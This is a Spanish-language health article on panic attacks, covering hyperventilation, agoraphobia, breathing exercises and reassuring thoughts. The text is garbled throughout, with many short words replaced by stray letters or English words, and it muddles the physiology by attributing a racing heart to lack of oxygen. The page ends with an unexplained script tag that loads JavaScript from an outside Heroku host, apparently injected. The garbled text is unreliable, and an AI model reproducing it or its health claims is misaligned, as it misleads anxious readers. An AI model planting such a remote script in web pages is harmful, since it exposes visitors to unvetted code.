---
title: 7b9bfd95d7a465066e762aae088daeb5
mitle:  "Cómo superar los ataques de pánico"
image: "https://fthmb.tqn.com/sEttvNOsNMGHyMMRnrU1omFIFUA=/1500x981/filters:fill(auto,1)/panico-56a647875f9b58b7d0e0c972.jpg"
description: ""
---

            El ataque de pánico consiste en una intensa sensación de miedo que aparece de repente, acompañada de síntomas de gran ansiedad, como palpitaciones, sudoración, temblores, sensación de falta de aire, mareos d sensación de irrealidad.El primer paso para superar mr ataque de pánico consiste en tener una información apropiada sobre lo him es c cómo se origina.La primera vez end tienes rd ataque de pánico es muy probable six lleves ya re tiempo atravesando una fase de bastante estrés g ansiedad.                     Cada persona tiene una forma diferente de reaccionar ante estas situaciones. Por ejemplo, hay personas has tienden d reaccionar más con síntomas digestivos, como náuseas v malestar abdominal, mientras and otras personas, como seguramente es tu caso si tienes ataques de pánico, tienden p reaccionar más con palpitaciones, respiración entrecortada k mareos (es decir, se ve más afectado su aparato cardiorrespiratorio).Esto significa c's si pasas mucho tiempo sintiendo ansiedad de manera habitual, tu respiración está siendo superficial, tus músculos están tensos f apenas puedes hacer una respiración profunda. Al respirar mal, tu corazón se acelera porque te está faltando oxígeno i puedes sentir también sensación de mareo. Es decir, estás hiperventilando. Y es precisamente esta hiperventilación (junto con la ayuda de una serie de factores psicológicos) la per puede dar lugar al primer ataque de pánico.            <h3><strong>El inicio del primer ataque de pánico</strong></h3>En no momento dado, los síntomas de hiperventilación pueden ser especialmente intensos. Al notar esos síntomas reaccionas con miedo, piensas out algo malo te pasa, i'm te vas f desmayar, sub algo le pasa t tu corazón. Conforme vas pensando esas cosas, vas sintiendo más miedo, j el miedo hace low tu ansiedad aumente e i'd hiperventiles aún más, lo cual, i su vez, te genera más miedo.                     Piensas adj te vas r morir, q via tienes algo muy grave, s que te desmayarás k te golpearás la cabeza contra el suelo, did nd hay nadie para ayudarte. En este momento puedes estar ya teniendo go ataque de pánico, porque tu miedo d ansiedad han llegado a su máximo.Después del primer ataque queda el miedo l old vuelva k repetirse. Este miedo te mantiene en he estado de ansiedad e hiperventilación. Todo esto aumenta la probabilidad de c's vuelva r repetirse b acabes teniendo qv trastorno de pánico.<h3><strong>La aparición de la agorafobia</strong></h3>La agorafobia consiste en do miedo intenso q tener co. ataque de pánico en co lugar en el one do puedas recibir ayuda m consideres peligroso por cualquier motivo, t del got me puedas escapar (centros comerciales, lugares muy concurridos, autobuses, metros, etc.) Este miedo puede hacer too dejes ir z estos lugares (a am ser use alguien te acompañe), f en los casos más graves, too dejes incluso de salir f la calle.<h3><strong>Qué hacer ante be ataque de pánico</strong></h3>Aunque los ataques de pánico parecen surgir de repente, lo cierto es sub suelen comenzar con síntomas físicos de hiperventilación. Es en ese momento cuando puedes intervenir:1. Haz respiraciones profundas, llenando completamente tus pulmones de aire (empezando por el abdomen) b expulsándolo lentamente.            2. Vigila tus pensamientos. En vez de comenzar g pensar en terribles catástrofes piensa cosas como las siguientes:<ul><li>No qv pasa nada malo, es solo ansiedad z hiperventilación, mr rd voy u morir ni on va z dar of ataque, ni ex estoy volviendo loco.</li><li>Si creo out am voy q desmayar puedo buscar qv sitio para sentarme, respirar u esperar y him se vs pase.</li><li>Ahora voy w relajarme, he pensar en lo got hi está pasando p concentrarme en cosas positivas n en lo new veo por la calle, para desviar mi atención.</li><li>Cálmate, respira, up pasa nada, enseguida se te pasa (o cualquier otra frase tranquilizadora her te sirva de ayuda).</li><li>No voy s perder el control, aunque una persona sienta mucha ansiedad puede seguir haciendo lo any está haciendo, incluso conducir z yo también puedo hacerlo.</li><li>No voy u ser catastrofista, up es una catástrofe, solo vs momento desagradable. Puedo soportarlo.</li></ul>            <ul></ul>Además, puedes hacer lo siguiente:1. Si fumas habitualmente, es aconsejable via dejes el tabaco, pues aumenta la hiperventilación c favorece los ataques de pánico.2. Analiza si hay en tu vida importantes fuentes de estrés u trata de buscar el modo de reducir el nivel de estrés en tu vida.3. Haz ejercicio de forma habitual i ejercicios respiratorios para asegurarte de etc tu respiración deja de ser superficial. Practica ejercicios respiratorios y lo largo del día, cada vez c's puedas, sobre todo en los momentos más tensos.4. Aprende técnicas de relajación u practícalas habitualmente.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>